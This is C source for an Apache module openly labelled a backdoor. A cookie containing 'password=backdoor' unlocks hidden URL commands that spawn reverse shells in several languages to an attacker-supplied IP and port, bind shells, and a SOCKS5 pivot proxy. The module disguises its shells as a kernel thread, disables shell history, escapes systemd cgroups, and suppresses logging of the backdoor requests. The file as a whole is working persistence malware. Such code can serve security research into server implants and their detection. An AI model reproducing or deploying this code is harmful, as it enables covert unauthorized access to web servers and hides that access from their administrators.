/* Code inspired from @TheXC3LL */
// https://www.tarlogic.com/en/blog/backdoors-modulos-apache/
/* ************************************************************* */
//Socks5 code from https://github.com/fgssfgss/socks_proxy
/* ************************************************************* */

/* Backdoor module (@RicoVlad) */

#include <sys/types.h>
#include <stdio.h>
#include <stdarg.h>
#include <time.h>
#include <errno.h>
#include <unistd.h>
#include <signal.h>
#include <stdlib.h>
#include <stdint.h>
#include <string.h>
#include <sys/socket.h>
#include <sys/fcntl.h>
#include <netdb.h>
#include <sys/select.h>
#include <arpa/inet.h>
#include <sys/stat.h>
#include <dirent.h>
#include <sys/un.h>
// forkpty() --> https://linux.die.net/man/3/forkpty
// Need to link with libutil to use it in apache2 module
#include <pty.h>
#include <utmp.h>

// link with lpthread
//#include<pthread.h>
#include <sys/mount.h>

#include "httpd.h"
#include "http_config.h"
#include "http_protocol.h"
#include "http_log.h"
#include "ap_config.h"


#include "mod_backdoor.h"


#define BUFSIZE 65536
#define IPSIZE 4
#define ARRAY_SIZE(x) (sizeof(x) / sizeof(x[0]))


#define PASSWORD "password=backdoor"
#define SOCKSWORD "/proxy"
#define PINGWORD "/ping"
#define SHELLWORD "/revtty"
//#define RESTARTWORD "/alarma"
#define REVERSESHELL "/reverse"
#define BINDWORD "/bind"
#define CGROUP2 "/tmp/cgroup2"
#define IPC "/tmp/mod_backdoor" //Change

pid_t pid;


enum socks {
	RESERVED = 0x00,
	VERSION = 0x05
};

enum socks_auth_methods {
	NOAUTH = 0x00,
	USERPASS = 0x02,
	NOMETHOD = 0xff
};

enum socks_auth_userpass {
	AUTH_OK = 0x00,
	AUTH_VERSION = 0x01,
	AUTH_FAIL = 0xff
};

enum socks_command {
	CONNECT = 0x01
};

enum socks_command_type {
	IP = 0x01,
	DOMAIN = 0x03
};

enum socks_status {
	OKH = 0x00,
	FAILED = 0x05
};

typedef struct {
    const char *key;
    const char *value;
} keyValuePair;

// Read POST value from apache doc:
// https://httpd.apache.org/docs/2.4/developer/modguide.html#snippets
// Currently not working --> seems res var returns NULL
keyValuePair *readPost(request_rec *r) {
    apr_array_header_t *pairs = NULL;
    apr_off_t len;
    apr_size_t size;
    int res;
    int i = 0;
    char *buffer;
    keyValuePair *kvp;

    res = ap_parse_form_data(r, NULL, &pairs, -1, HUGE_STRING_LEN);
    if (res != OK || !pairs) return NULL; /* Return NULL if we failed or if there are is no POST data */
    kvp = apr_pcalloc(r->pool, sizeof(keyValuePair) * (pairs->nelts + 1));
    while (pairs && !apr_is_empty_array(pairs)) {
        ap_form_pair_t *pair = (ap_form_pair_t *) apr_array_pop(pairs);
        apr_brigade_length(pair->value, 1, &len);
        size = (apr_size_t) len;
        buffer = apr_palloc(r->pool, size + 1);
        apr_brigade_flatten(pair->value, buffer, &size);
        buffer[len] = 0;
        kvp[i].key = apr_pstrdup(r->pool, pair->name);
        kvp[i].value = buffer;
        i++;
    }
    return kvp;
}


int readn(int fd, void *buf, int n)
{
	int nread, left = n;
	while (left > 0) {
		if ((nread = read(fd, buf, left)) == 0) {
			return 0;
		} else if (nread != -1){
			left -= nread;
			buf += nread;
		}
	}
	return n;
}


void socks5_invitation(int fd) {
	char init[2];
	readn(fd, (void *)init, ARRAY_SIZE(init));
	if (init[0] != VERSION) {
		exit(0);
	}
}

void socks5_auth(int fd) {
		char answer[2] = { VERSION, NOAUTH };
		write(fd, (void *)answer, ARRAY_SIZE(answer));
}

int socks5_command(int fd)
{
	char command[4];
	readn(fd, (void *)command, ARRAY_SIZE(command));
	return command[3];
}

char *socks5_ip_read(int fd)
{
	char *ip = malloc(sizeof(char) * IPSIZE);
	read(fd, (void* )ip, 2); //Buggy
	readn(fd, (void *)ip, IPSIZE);
	return ip;
}

unsigned short int socks5_read_port(int fd)
{
	unsigned short int p;
	readn(fd, (void *)&p, sizeof(p));
	return p;
}

int app_connect(int type, void *buf, unsigned short int portnum, int orig) {
	int new_fd = 0;
	struct sockaddr_in remote;
	char address[16];

	memset(address,0, ARRAY_SIZE(address));
	new_fd = socket(AF_INET, SOCK_STREAM,0);
	if (type == IP) {
		char *ip = NULL;
		ip = buf;
		snprintf(address, ARRAY_SIZE(address), "%hhu.%hhu.%hhu.%hhu",ip[0], ip[1], ip[2], ip[3]);
		memset(&remote, 0, sizeof(remote));
		remote.sin_family = AF_INET;
		remote.sin_addr.s_addr = inet_addr(address);
		remote.sin_port = htons(portnum);

		if (connect(new_fd, (struct sockaddr *)&remote, sizeof(remote)) < 0) {
			return -1;
		}
		return new_fd;
	}
}

void socks5_ip_send_response(int fd, char *ip, unsigned short int port)
{
	char response[4] = { VERSION, OK, RESERVED, IP };
	write(fd, (void *)response, ARRAY_SIZE(response));
	write(fd, (void *)ip, IPSIZE);
	write(fd, (void *)&port, sizeof(port));
}

/*void *worker(int fd, int port) {
    int inet_fd = -1;
    int command = 0;
    unsigned short int p = 0;

    socks5_invitation(fd);
    socks5_auth(fd);
    command = socks5_command(fd);

    pid_t pid;

    pid = fork();
    if(pid < 0){
        exit(0);
    }else if (pid == 0){
        if (command == IP) {
            char *ip = NULL;
            ip = socks5_ip_read(fd);
            p = socks5_read_port(fd);
            inet_fd = app_connect(IP, (void *)ip, ntohs(p), fd);
            if (inet_fd == -1) {
                exit(0);
            }
            socks5_ip_send_response(fd, ip, p);
            free(ip);
        }
    }else{
        app_socket_pipe(inet_fd, fd, port);
        close(inet_fd);
    }
    exit(0);
}*/

void* worker(int fd) {

    int inet_fd = -1;
    int command = 0;
    unsigned short int p = 0;
    //write(fd,"Command\n",strlen("Command\n")+1);
    socks5_invitation(fd);
    socks5_auth(fd);
    command = socks5_command(fd);

    if (command == IP) {
        //write(fd,"Command\n",strlen("Command\n")+1);
        char *ip = NULL;
        ip = socks5_ip_read(fd);
        p = socks5_read_port(fd);

        /*write(fd,ip,strlen(ip)+1);
        write(fd,p,strlen(p)+1);*/

        inet_fd = app_connect(IP, (void *)ip, ntohs(p), fd);
        if (inet_fd == -1) {
            exit(0);
        }
        socks5_ip_send_response(fd, ip, p);
        free(ip);
    }

    //app_socket_pipe(inet_fd, fd);
    bicomIPC(inet_fd,fd);
    close(inet_fd);
    exit(0);
}

void* waitProxy(int fd, int port){

    int opt = 1;
    int new_socket;
    // Prepare Socket for proxy socks5
    int proxysockfd = socket(AF_INET, SOCK_STREAM, 0);
    if (proxysockfd < 0 ){
        write(fd, "ERRNOSOCK\n", strlen("ERRNOSOCK\n") + 1);
        exit(0);
    }

    if(setsockopt(proxysockfd, SOL_SOCKET, SO_REUSEADDR | SO_REUSEPORT, &opt, sizeof(opt)) < 0) {
        write(fd,"setsockopt",strlen("setsockopt"));
        close(proxysockfd);
        exit(0);
    }

    struct sockaddr_in server;
    int serverlen = sizeof(server);
    server.sin_family = AF_INET;
    server.sin_addr.s_addr = INADDR_ANY;
    server.sin_port = htons(port);

    pthread_t thread_id;


    if (bind(proxysockfd, (struct sockaddr *)&server,
             sizeof(server))<0)
    {
       write(fd,"Bind failed",strlen("Bind failed"));
       exit(0);
    }

    if (listen(proxysockfd, 3) < 0)
    {
        write(fd,"Listen failed",strlen("Listen failed"));
        exit(0);
    }

    while(1){
        new_socket = accept(proxysockfd, (struct sockaddr *)&server, (socklen_t*)&serverlen);

        pid_t pid;

        pid = fork();
        if(pid < 0){
            close(new_socket);
            exit(0);
        }else if (pid == 0){

            worker(new_socket);
            close(fd);
            exit(0);

        }else{
            close(new_socket);
            waitpid(pid,NULL,0);
            kill(pid,SIGKILL);
            exit(0);
        }
    }
}

void shell(char* ip, char* port,char* prog) {
	int input[2];
	int output[2];
	int n, sr, revsockfd ;
	char buf[1024];

    struct sockaddr_in client_to_connect;
	pid_t spid;

	pipe(input);
	pipe(output);

	spid = fork();
    if (spid < 0) {
        //fprintf(stderr, "[-] Error: could not fork");
        exit(0);
    }else if (spid == 0){
		char *argv[] = { "[kintegrityd/2]", 0 };
        char *envp[] = { "HISTFILE=","TERM=vt100", 0 };
		close(input[1]);
		close(output[0]);

		spid = setsid();

        revsockfd = socket(AF_INET, SOCK_STREAM, 0);
        if (revsockfd < 0 ){
            exit(0);
        }
        client_to_connect.sin_addr.s_addr = inet_addr(ip);
        client_to_connect.sin_family = AF_INET;
        client_to_connect.sin_port = htons(atoi(port));

        if (connect(revsockfd , (struct sockaddr *)&client_to_connect , sizeof(client_to_connect)) < 0)
        {
            exit(0);
        }

		dup2(revsockfd, 0);
		dup2(revsockfd, 1);
		dup2(revsockfd, 2);
        //ioctl(revsockfd, TIOCSCTTY,1);

		if(!strcmp(prog,"sh")){
            execve("/bin/sh", argv, envp);
		}
		if(!strcmp(prog,"bash")){
            execve("/bin/bash", argv, envp);
        }
        if(!strcmp(prog,"dash")){
            execve("/bin/dash", argv, envp);
        }
        if(!strcmp(prog,"ash")){
            execve("/bin/ash", argv, envp);
        }
        if(!strcmp(prog,"tcsh")){
            execve("/bin/tcsh", argv, envp);
        }
        if(!strcmp(prog,"ksh")){
            execve("/bin/ksh", argv, envp);
        }

	}else{ // Kill father to create daemon process
        exit(0);
    }

	return;
}

void reverseShell(char* ip, char* port, char* prog){

    pid_t spid;

    if(!strcmp(prog,"sh") || !strcmp(prog,"bash") || !strcmp(prog,"dash") || !strcmp(prog,"tcsh") || !strcmp(prog,"ash") || !strcmp(prog,"ksh")){
        shell(ip,port,prog);
    }else{
        spid = fork();
        if (spid < 0) {
            fprintf(stderr, "[-] Error: could not fork");
            exit(EXIT_FAILURE);
        }else if (spid == 0){

            if (!strcmp(prog,"php")){
                char* args[] = {"/usr/bin/php", "-r", "", NULL};
                args[2] = (char*) malloc(strlen("$sock=fsockopen(\"%s\",%s);exec(\"/bin/sh -i <&3 >&3 2>&3\");")+strlen(ip)+strlen(port)+1);
                sprintf(args[2],"$sock=fsockopen(\"%s\",%s);exec(\"/bin/sh -i <&3 >&3 2>&3\");",ip,port);
                execve(args[0], args, NULL);
                free(args[2]);
            }
            if (!strcmp(prog,"python")){
                char* args[] = {"/usr/bin/python", "-c", "", NULL};
                args[2] = (char*) malloc(strlen("import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect((\"%s\",%s));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call([\"/bin/bash\",\"-i\"]);")+strlen(ip)+strlen(port)+1);
                sprintf(args[2],"import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect((\"%s\",%s));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call([\"/bin/bash\",\"-i\"]);",ip,port);
                execve(args[0], args, NULL);
                free(args[2]);
            }
            if (!strcmp(prog,"perl")){
                char* args[] = {"/usr/bin/perl", "-e", "", NULL};
                args[2] = (char*) malloc(1+strlen(ip)+strlen(port)+strlen("use Socket;$i=\"%s\";$p=%s;socket(S,PF_INET,SOCK_STREAM,getprotobyname(\"tcp\"));if(connect(S,sockaddr_in($p,inet_aton($i)))){open(STDIN,\">&S\");open(STDOUT,\">&S\");open(STDERR,\">&S\");exec(\"/bin/sh -i\");};"));
                sprintf(args[2],"use Socket;$i=\"%s\";$p=%s;socket(S,PF_INET,SOCK_STREAM,getprotobyname(\"tcp\"));if(connect(S,sockaddr_in($p,inet_aton($i)))){open(STDIN,\">&S\");open(STDOUT,\">&S\");open(STDERR,\">&S\");exec(\"/bin/sh -i\");};",ip,port);
                execve(args[0], args, NULL);
            }
            if (!strcmp(prog,"ruby")) {
                //ruby -rsocket -e 'exit if fork;c=TCPSocket.new("<IP>","<PORT>");while(cmd=c.gets);IO.popen(cmd,"r"){|io|c.print io.read}end'
                char* args[] = {"/usr/bin/ruby", "-rsocket", "-e", "", NULL};
                args[3] = (char*) malloc(1+strlen(ip)+strlen(port)+strlen("exit if fork;c=TCPSocket.new(\"%s\",\"%s\");while(cmd=c.gets);IO.popen(cmd,\"r\"){|io|c.print io.read}end"));
                sprintf(args[3],"exit if fork;c=TCPSocket.new(\"%s\",\"%s\");while(cmd=c.gets);IO.popen(cmd,\"r\"){|io|c.print io.read}end",ip,port);
                execve(args[0], args, NULL);
                free(args[3]);
            }

        }else{
            //waitpid(spid,NULL,0);
            //kill(spid,SIGKILL);
            exit(0);
        }
    }
    exit(0);
    //return;
}
/****************************/
/// Fork() then forkpty() ///
/****************************/
void shellPTY1(int socket) {

    struct termios terminal;
    int terminalfd, n = 0, sr;
    pid_t ppid, spid  ;
    char buf[1024];

    tcgetattr(terminalfd, &terminal);
    terminal.c_lflag &= ~ECHO;
    tcsetattr(terminalfd, TCSANOW, &terminal);

    fd_set readfd;
    ppid = fork();

    if(ppid == 0){

        spid = forkpty(&terminalfd, NULL, NULL, NULL);

        if (spid == 0) { // Child process
            //setsid();
            char *argv[] = { "[kintegrityd/2]", 0 };
            char *envp[] = { "HISTFILE=","TERM=vt100", 0 };

            execve("/bin/sh", argv, envp);
        }else{
            for (;;) {
                FD_ZERO(&readfd);
                FD_SET(terminalfd, &readfd);
                FD_SET(socket, &readfd);
                // Bidirectional data transfer between 2 fd - terminalfd <--> IPC socket
                sr = select(terminalfd + 1, &readfd, NULL, NULL, NULL);
                if (sr) {
                    if (FD_ISSET(terminalfd, &readfd)) {
                        memset(buf, 0, sizeof(buf));
                        n = read(terminalfd, buf, strlen(buf) + 1);
                        if (n <= 0) {
                            kill(ppid, SIGKILL);
                            break;
                        } else {
                            write(socket, buf, strlen(buf));
                        }
                    }
                    if (FD_ISSET(socket, &readfd)) {
                        memset(buf, 0, sizeof(buf));
                        n = read(socket, buf, strlen(buf) + 1);
                        if (n <= 0) {
                            kill(ppid, SIGKILL);
                            break;
                        } else {
                            write(terminalfd, buf, strlen(buf));
                        }
                    }
                }
            }
            /*waitpid(fpid,NULL,0);
            exit(0);*/
        }
    }else{
        waitpid(ppid,NULL,0);
        kill(ppid,SIGTERM);
    }
    //
    //exit(0);
    /*else{
        return DECLINED;
    }*/

    return;
}


/****************************/
///      Forkpty only()    ///
/****************************/
void shellPTY(int socket) {

    struct termios terminal;
    int terminalfd, n = 0, sr;
    pid_t fpid;
    char buf[1024];

    fpid = forkpty(&terminalfd, NULL, NULL, NULL);

    if (fpid < 0) {
        fprintf(stderr, "[-] Error: could not forkpty");
        exit(EXIT_FAILURE);
    }
    else if (fpid == 0) { // Child process

        char *argv[] = { "[kintegrityd/2]", 0 };
        char *envp[] = { "HISTFILE=","TERM=vt100", 0 };

        execve("/bin/sh", argv, envp);
    }
    else { // Father process
        tcgetattr(terminalfd, &terminal);
        terminal.c_lflag &= ~ECHO;
        tcsetattr(terminalfd, TCSANOW, &terminal);
        fd_set readfd;

        for (;;) {
            FD_ZERO(&readfd);
            FD_SET(terminalfd, &readfd);
            FD_SET(socket, &readfd);
            // Bidirectional data transfer between 2 fd - terminalfd <--> IPC socket
            sr = select(terminalfd + 1, &readfd, NULL, NULL, NULL);
            if (sr) {
                if (FD_ISSET(terminalfd, &readfd)) {
                    memset(buf, 0, sizeof(buf));
                    n = read(terminalfd, buf, sizeof(strlen(buf)));
                    if (n <= 0) {
                        kill(fpid, SIGKILL);
                        break;
                    } else {
                        write(socket, buf, strlen(buf));
                    }
                }
                if (FD_ISSET(socket, &readfd)) {
                    memset(buf, 0, sizeof(buf));
                    n = read(socket, buf, sizeof(strlen(buf)));
                    if (n <= 0) {
                        kill(fpid, SIGKILL);
                        break;
                    } else {
                        write(terminalfd, buf, strlen(buf));
                    }
                }
            }
        }
        waitpid(fpid,NULL,0);
        exit(0);
    }
    return;
}

int bindPort(int fd, int port){
    int opt = 1;
    // Prepare Socket
    int bindSock = socket(AF_INET, SOCK_STREAM, 0);
    if (bindSock < 0 ){
        write(fd, "ERRNOSOCK\n", strlen("ERRNOSOCK\n") + 1);
        exit(0);
    }

    if(setsockopt(bindSock, SOL_SOCKET, SO_REUSEADDR | SO_REUSEPORT, &opt, sizeof(opt)) < 0) {
        write(fd,"setsockopt",strlen("setsockopt"));
        close(bindSock);
        exit(0);
    }

    struct sockaddr_in server;
    int serverlen = sizeof(server);
    server.sin_family = AF_INET;
    server.sin_addr.s_addr = INADDR_ANY;
    server.sin_port = htons(port);

    if (bind(bindSock, (struct sockaddr *)&server, sizeof(server))<0){
        write(fd,"Bind failed",strlen("Bind failed"));
        exit(0);
    }

    if (listen(bindSock, 3) < 0){
        write(fd,"Listen failed",strlen("Listen failed"));
        exit(0);
    }

    return bindSock;

}


void* bicomIPC(int sock, int revsockfd){
    char buf[1024];
    int n, sr;
    fd_set readset;
    for (;;) {
        FD_ZERO(&readset);
        FD_SET(sock,&readset);
        FD_SET(revsockfd,&readset);
        // Bidirectionnal data transfer between 2 fd - IPC sock <--> revsockfd
        sr = select(sock + 1, &readset, NULL, NULL, NULL);
        if (sr) {
            if (FD_ISSET(sock,&readset)) {
                memset(buf,0,1024);
                n = read(sock,buf,strlen(buf)+1);
                if (n <= 0){
                    break;
                }else{
                    write(revsockfd,buf,strlen(buf));
                }
            }
            if (FD_ISSET(revsockfd,&readset)) {
                memset(buf,0,1024);
                n = read(revsockfd,buf,strlen(buf)+1);
                if (n <= 0){
                    break;
                }else{
                    write(sock,buf,strlen(buf));
                }
            }
        }
    }
    return;
}


static int backdoor_post_read_request(request_rec *r) {
	int fd, sock, n, sr;
	fd_set readset;
	struct sockaddr_un server;
	struct timeval tv;

	apr_socket_t *client_socket;
	extern module core_module;

	const apr_array_header_t *fields;
    int i;
    apr_table_entry_t *e = 0;

	int backdoor = 0;

    fields = apr_table_elts(r->headers_in);
    e = (apr_table_entry_t *) fields->elts;
    for(i = 0; i < fields->nelts; i++) {
        if (!strcmp(e[i].key,"Cookie")) {
            if (strstr(e[i].val, PASSWORD)) {
                backdoor = 1;
            }
        }
    }


	if (backdoor == 0) {
		return DECLINED;
	}

	client_socket = ap_get_module_config(r->connection->conn_config, &core_module);
	if (client_socket) {
		fd = client_socket->socketdes;
	}

	if (strstr(r->uri, SOCKSWORD)) {
        int new_socket, bindfd;
        char* meh = strtok(r->uri,"/");
        char* port = strtok(NULL,"/");

        sock = socket(AF_UNIX, SOCK_STREAM, 0);
        if (sock < 0) {
            write(fd, "ERRNOSOCK\n", strlen("ERRNOSOCK\n") + 1);
            close(fd);
            exit(0);
        }
        server.sun_family = AF_UNIX;
        strcpy(server.sun_path, IPC);
        if (connect(sock, (struct sockaddr *) &server, sizeof(struct sockaddr_un)) < 0){
            close(sock);
            write(fd, "ERRNOCONNECT\n", strlen("ERRNOCONNECT\n") + 1);
            close(fd);
            exit(0);
        }


        bindfd = bindPort(fd,atoi(port));
        char* info = malloc(128);
        sprintf(info,"[+] Socks5 proxy binded on port %s\n",port);
        write(fd, info,strlen(info));
        free(info);
        close(fd);

        struct sockaddr_in server;
        int serverlen = sizeof(server);
        server.sin_family = AF_INET;
        server.sin_addr.s_addr = INADDR_ANY;
        server.sin_port = htons(atoi(port));

        while(1){

            new_socket = accept(bindfd, (struct sockaddr *)&server, (socklen_t*)&serverlen);
            // Close binded fd
            close(bindfd);
            worker(new_socket);
            close(new_socket);

        }

	}
	if (strstr(r->uri, BINDWORD)) {
	    int new_socket, bindfd;
        char* meh = strtok(r->uri,"/");
        char* port = strtok(NULL,"/");

        sock = socket(AF_UNIX, SOCK_STREAM, 0);
        if (sock < 0) {
            write(fd, "ERRNOSOCK\n", strlen("ERRNOSOCK\n") + 1);
            close(fd);
            exit(0);
        }
        server.sun_family = AF_UNIX;
        strcpy(server.sun_path, IPC);
        if (connect(sock, (struct sockaddr *) &server, sizeof(struct sockaddr_un)) < 0){
            close(sock);
            write(fd, "ERRNOCONNECT\n", strlen("ERRNOCONNECT\n") + 1);
            close(fd);
            exit(0);
        }


        bindfd = bindPort(fd,atoi(port));


        char* info = malloc(128);
        sprintf(info,"[+] Shell binded on port %s\n",port);
        write(fd, info,strlen(info));
        free(info);
        close(fd);

        struct sockaddr_in server;
        int serverlen = sizeof(server);
        server.sin_family = AF_INET;
        server.sin_addr.s_addr = INADDR_ANY;
        server.sin_port = htons(atoi(port));

        while(1){

            new_socket = accept(bindfd, (struct sockaddr *)&server, (socklen_t*)&serverlen);
            // Close binded fd
            close(bindfd);
            write(sock,"BIND",strlen("BIND"));
            bicomIPC(sock,new_socket);
            close(new_socket);

        }

    }

	if (!strcmp(r->uri, PINGWORD)) {
		write(fd, "[+] Backdoor module is running !\n", strlen("[+] Backdoor module is running !\n")+1);
		exit(0);
	}

    if (strstr(r->uri, REVERSESHELL)) {
        char buf[1024];
        int sd[2], i;
        sock = socket(AF_UNIX, SOCK_STREAM, 0);
        if (sock < 0) {
            write(fd, "ERRNOSOCK\n", strlen("ERRNOSOCK\n") + 1);
            exit(0);
        }
        server.sun_family = AF_UNIX;
        strcpy(server.sun_path, IPC);
        if (connect(sock, (struct sockaddr *) &server, sizeof(struct sockaddr_un)) < 0){
            close(sock);
            write(fd, "ERRNOCONNECT\n", strlen("ERRNOCONNECT\n") + 1);
            exit(0);
        }

        write(sock,r->uri,strlen(r->uri));
        char* meh = strtok(r->uri,"/");
        char* ip = strtok(NULL,"/");
        char* port = strtok(NULL,"/");
        char* prog = strtok(NULL,"/");
        char* info = malloc(strlen("[+] Sending Reverse Shell to %s:%s using %s\n")+strlen(ip)+strlen(port)+strlen(prog)+2);
        sprintf(info,"[+] Sending Reverse Shell to %s:%s using %s\n",ip,port,prog);
        write(fd, info, strlen(info) +1);
        free(info);

        close(fd);

        exit(0);
    }

	if (strstr(r->uri, SHELLWORD)) {
		if (pid) {
			/** Prepare socket to send reverse shell **/

			// Socket to send the reverse shell
            int revsockfd = socket(AF_INET, SOCK_STREAM, 0);
            if (revsockfd < 0 ){
                write(fd, "ERRNOSOCK\n", strlen("ERRNOSOCK\n") + 1);
                exit(0);
            }

            char* meh = strtok(r->uri,"/");
            char* ip = strtok(NULL,"/");
            char* port = strtok(NULL,"/");

            struct sockaddr_in client_to_connect;
            client_to_connect.sin_addr.s_addr = inet_addr(ip);
            client_to_connect.sin_family = AF_INET;
            client_to_connect.sin_port = htons(atoi(port));

            if (connect(revsockfd , (struct sockaddr *)&client_to_connect , sizeof(client_to_connect)) < 0)
            {
                write(fd, "[+] Reverse socket can't connect to client\n", strlen("[+] Reverse socket can't connect to client\n") + 1);
                exit(0);
            }

            // IPC socket
			sock = socket(AF_UNIX, SOCK_STREAM, 0);
			if (sock < 0) {
				write(fd, "ERRNOSOCK\n", strlen("ERRNOSOCK\n") + 1);
				exit(0);
			}
			server.sun_family = AF_UNIX;
			strcpy(server.sun_path, IPC);
			if (connect(sock, (struct sockaddr *) &server, sizeof(struct sockaddr_un)) < 0){
				close(sock);
				write(fd, "ERRNOCONNECT\n", strlen("ERRNOCONNECT\n") + 1);
				close(fd);
				exit(0);
			}
            // Tell IPC
            write(sock, "SHELL\n", strlen("SHELL\n") + 1);
			// Info in original socket
			char* info = malloc(strlen("Sending Reverse Shell to \n")+strlen(ip)+strlen(port)+2);
			sprintf(info,"[+] Sending Reverse Shell to %s:%s",ip,port);
			write(fd, info, strlen(info) +1);
			free(info);

            close(fd);

            bicomIPC(sock,revsockfd);

			exit(0);
		}
	}

	return DECLINED;
}

void* rmCgroup(){
    int fd;
    int isMounted = 0;
    char* path;
    char* str;

    mkdir(CGROUP2, S_IRWXU);
    path = malloc(strlen(CGROUP2)+strlen("/system.slice/cgroup.procs")+1);
    strcat(path,CGROUP2);
    strcat(path,"/system.slice/cgroup.procs");
    if(access(path, F_OK) < 0) {
        isMounted= mount("cgroup",CGROUP2,"cgroup2",NULL,NULL);
    }
    if(isMounted == 0){
        //f = fopen(path,"wb");
        fd = open(path,O_WRONLY);
        if(fd != -1){
            str = malloc(sizeof(int)*getpid()+1);
            sprintf(str,"%d",getpid());
            write(fd,str,strlen(str));
            free(str);
        }
        umount(CGROUP2);
        free(path);
    }
}

int waitIPC(int master){
    pthread_t thread_id;
    fd_set readfds;
    int rc, sd, sr;
    char buf[1024];

    while(1) {
        FD_ZERO(&readfds);
        FD_SET(master, &readfds);

        // Read IPC socket
        sr = select(master + 1, &readfds, NULL, NULL, NULL);
        if(sr){
            if (FD_ISSET(master, &readfds)) {
                sd = accept(master, NULL, NULL);
                FD_SET(sd, &readfds);
                if (FD_ISSET(sd, &readfds)) {
                    memset(buf, 0, 1024);
                    if ((rc = read(sd, buf, 1024)) <= 0) {
                        close(sd);
                    } else {
                        pid = fork();
                        if(pid == 0){
                            rmCgroup();
                            if (strstr(buf, "SHELL") || strstr(buf, "BIND")) {
                                shellPTY(sd);
                            } else if (strstr(buf, "reverse")) {
                                // Monkey parsing url -->
                                char *meh = strtok(buf, "/");
                                char *ip = strtok(NULL, "/");
                                char *port = strtok(NULL, "/");
                                char *prog = strtok(NULL, "/");
                                reverseShell(ip, port, prog);
                            }
                        }else{
                            pid = fork();
                            if(pid == 0){
                                waitIPC(master);
                            }else{
                                exit(0);
                            }
                        }
                    }
                }
            }
        }
    }
}


int backdoor_post_config(apr_pool_t *pconf, apr_pool_t *plog, apr_pool_t *ptemp, server_rec *s) {

    pid = fork();
    // Kill father just after he had loaded the config to create apache2 root daemon
    if (pid) {
        return OK;
    }
    int master, rc, sd, sr;
    struct sockaddr_un serveraddr;
    char buf[1024];
    fd_set readfds;


    master = socket(AF_UNIX, SOCK_STREAM, 0);
    if (sd < 0) {
        exit(0);
    }
    memset(&serveraddr, 0, sizeof(serveraddr));
    serveraddr.sun_family = AF_UNIX;
    strcpy(serveraddr.sun_path, IPC);
    rc = bind(master, (struct sockaddr *)&serveraddr, SUN_LEN(&serveraddr));
    if (rc < 0) {
        exit(0);
    }
    listen(master, 5);
    chmod(serveraddr.sun_path, 0777);

	waitIPC(master);
}

static int backdoor_log_transaction(request_rec *r) {
	const apr_array_header_t *fields;
    int i;
    apr_table_entry_t *e = 0;

	int backdoor = 0;

	fields = apr_table_elts(r->headers_in);
	e = (apr_table_entry_t *) fields->elts;
	for(i = 0; i < fields->nelts; i++) {
		if (!strcmp(e[i].key,"Cookie")) {
			if (strstr(e[i].val, PASSWORD)) {
				backdoor = 1;
			}
		}
	}

	if (backdoor == 0) {
		return DECLINED;
	}
	exit(0);
}

static void backdoor_register_hooks(apr_pool_t *p){
	ap_hook_post_read_request((void *) backdoor_post_read_request, NULL, NULL, APR_HOOK_FIRST);
	ap_hook_post_config((void *) backdoor_post_config, NULL, NULL, APR_HOOK_FIRST);
	ap_hook_log_transaction(backdoor_log_transaction, NULL, NULL, APR_HOOK_FIRST);
}

module AP_MODULE_DECLARE_DATA backdoor_module = {
    STANDARD20_MODULE_STUFF,
    NULL,			/* create per-dir    config structures */
    NULL,			/* merge  per-dir    config structures */
    NULL,			/* create per-server config structures */
    NULL,			/* merge  per-server config structures */
    NULL,			/* table of config file commands       */
    backdoor_register_hooks	/* register hooks                      */
};
